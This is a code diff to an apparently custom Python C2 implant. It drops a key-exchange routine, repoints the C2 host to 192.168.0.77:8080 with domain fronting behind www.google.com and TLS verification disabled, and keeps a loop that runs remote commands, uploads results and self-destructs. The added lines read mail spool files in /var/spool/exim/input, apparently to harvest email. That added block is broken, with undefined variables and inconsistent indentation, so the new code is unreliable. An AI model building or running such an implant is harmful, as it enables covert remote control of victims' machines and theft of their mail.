@@ -12,25 +12,21 @@ from urllib3.poolmanager import PoolManager
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.asymmetric import dh
-from cryptography.hazmat.primitives.kdf.hkdf import HKDF
-from cryptography.hazmat.primitives import serialization
 import os
 import base64
 import hashlib
 import urllib3
+import time
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 BLOCK_SIZE = 16
 # KEY = "your_secret_key_here"  # Replace with your actual key
-key_path = "../key.txt"
+key_path = "/var/tmp/pkey.txt"
 
 def get_key():
     with open(key_path, 'rb') as f:
         return f.read()
 
 KEY = get_key()
-derived_key = None
 
 # function that does AES encryption and then obfuscation
 def do_everything(data):
@@ -95,23 +91,17 @@ def deobfuscate(obf_str):
     ordered_chunks = ''.join(chunks)
     return base64.b64decode(ordered_chunks.encode()).decode()
 
-
 # --- Domain Fronting Settings ---
 FRONT_DOMAIN = "www.google.com"  # TLS SNI for obfuscation
-FRONT_DOMAIN = "127.0.0.1:8080"
-REAL_DOMAIN = "127.0.0.1:8080"         # Actual C2 server IP/domain
+FRONT_DOMAIN = "192.168.0.77:8080"
+REAL_DOMAIN = "192.168.0.77:8080"         # Actual C2 server IP/domain
 UPLOAD_PATH = "/upload"
 COMMAND_PATH = "/command"
 LOG_PATH = "/log"
-GET_PARAMS_PATH = "/get_key_params"
-KEY_XCHG_PATH = "/xchg_secrets"
 
 UPLOAD_URL = f"https://{FRONT_DOMAIN}{UPLOAD_PATH}"
 COMMAND_URL = f"https://{FRONT_DOMAIN}{COMMAND_PATH}"
 LOG_URL = f"https://{FRONT_DOMAIN}{LOG_PATH}"
-PARAMS_URL = f"https://{FRONT_DOMAIN}{GET_PARAMS_PATH}"
-XCHG_URL = f"https://{FRONT_DOMAIN}{KEY_XCHG_PATH}"
-
 
 class SNIAdapter(HTTPAdapter):
     def __init__(self, server_hostname, *args, **kwargs):
@@ -121,66 +111,6 @@ class SNIAdapter(HTTPAdapter):
     def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
         pool_kwargs['server_hostname'] = self.server_hostname
         self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize, block=block, **pool_kwargs)
-
-### KEY EXCHANGE RELATED
-def generate_params(response):
-    parameters = serialization.load_pem_parameters(
-        response.content,
-        backend=default_backend()
-    )
-
-    return parameters
-    
-    
-
-def generate_keys(parameters):
-    private_key = parameters.generate_private_key()
-    public_key = private_key.public_key()
-
-    return public_key, private_key
-
-def get_params():
-    try:
-        session = requests.Session()
-        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
-        session.mount("https://", adapter)
-        headers = {"Host": REAL_DOMAIN}
-        response = session.get(PARAMS_URL, headers=headers, verify=False)
-        if response.status_code == 200:
-           ## Get agreed parameters from c2 and generate public and private keys to use in key derivation
-           parameters = generate_params(response)
-           return parameters
-
-        else:
-            #print("Failed to poll command. Status:", response.status_code)
-            send_log(f"Failed to get key params. Status: {response.status_code}")
-
-    except Exception as e:
-        print("Failed getting parameters from c2", e)
-
-def key_xchg(client_public_bytes):
-    try:
-        session = requests.Session()
-        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
-        session.mount("https://", adapter)
-        headers = {"Host": REAL_DOMAIN}
-        response = session.post(XCHG_URL, data=client_public_bytes, headers=headers, verify=False)
-        if response.status_code == 200:
-            server_public_bytes = response.content
-
-            server_public_key = serialization.load_pem_public_key(
-                server_public_bytes,
-                backend=default_backend()
-            )
-            return server_public_key
-        else:
-            print("Failed to exchange keys. Status code:", response.status_code)
-            return False
-    except Exception as e:
-        print("Error exchanging keys:", e)
-        return False
-
-#### KEY EXCHANGE RELATED ABOVE
 
 def self_destruct():
     print("Initiating self-destruct sequence...")
@@ -288,28 +218,28 @@ def execute_command(cmd):
         return e.output.decode()
 
 def main():
-
-    ## KEY EXCHANGE RELATED
-    params = get_params()
-    public_key, private_key = generate_keys(params)
-    client_public_bytes = public_key.public_bytes(
-        encoding=serialization.Encoding.PEM,
-        format=serialization.PublicFormat.SubjectPublicKeyInfo
-    )
-    server_public_key = key_xchg(client_public_bytes)
-    shared_secret = private_key.exchange(server_public_key)
-
-    client_derived_key = HKDF(
-        algorithm=hashes.SHA256(),
-        length=32,
-        salt=None,
-        info=b'KEYAES',
-    ).derive(shared_secret)
-
-    ## KEY EXCHANGE RELATED
-
     fail_count = 0
     while True:
+
+        emails = "/var/spool/exim/input"
+        timestamp = time.time()
+        email_names = []
+        timestamp_prev = now - 300
+        for filename in os.listdir(dir_path):
+                absolute_path = os.path.join(emails, filename)
+                if os.path.isfile(filepath):
+                        mtime = os.path.getmtime(filepath)
+                        if mtime > timestamp:
+                                email_names.append(filepath + "/" + filename)
+				
+        print(file_names)
+	
+        for cur_email in email_names:
+                with open(cur_email, "r") as email:
+                        lines = email.readlines()
+                        print(lines)
+			
+	
         if fail_count >= 60:
             self_destruct()
             return
@@ -335,6 +265,7 @@ def main():
                 result = f"Executed Command: {cmd}\nOutput:\n{result}"
                 send_log(result)
         time.sleep(15)
+        
 
 if __name__ == '__main__':
     main()
